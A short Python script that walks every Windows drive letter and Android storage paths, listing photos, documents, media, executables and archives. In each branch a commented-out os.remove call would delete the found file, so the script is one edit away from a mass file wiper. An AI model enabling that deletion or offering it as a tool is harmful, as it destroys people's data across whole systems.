import os, shutil, time, platform
sles = '\\' if platform.system().lower() == 'windows' else '//'

drive = ["D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "M:\\", "V:\\", "Q:\\", "Z:\\", "Y:\\", "W:\\", "T:\\", "X:\\", "S:\\", "U:\\", "R:\\", "I:\\", "J:\\", "K:\\", "L:\\", "N:\\", "O:\\", "P:\\", "C:\\", "/storage/emulated/0/", "/storage/sdcard1/"]
for path in drive[0: ]:
#	listpath = os.walk(path)
	for root_path, dirc, files in os.walk(path):		
		for file in files:
			try:
				if file.endswith('.jpg'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.jpeg'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.png'): 
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.pdf'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.txt'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.doc'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.xls'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.mp3'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.mp4'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.exe'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.zip'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				elif file.endswith('.rar'):
					f = os.path.join(root_path, file)
					print(f)
					print(file)
					# os.remove(f)
				else:
					pass
			except Exception as e:
				print("sumthing is rong :", e)
			
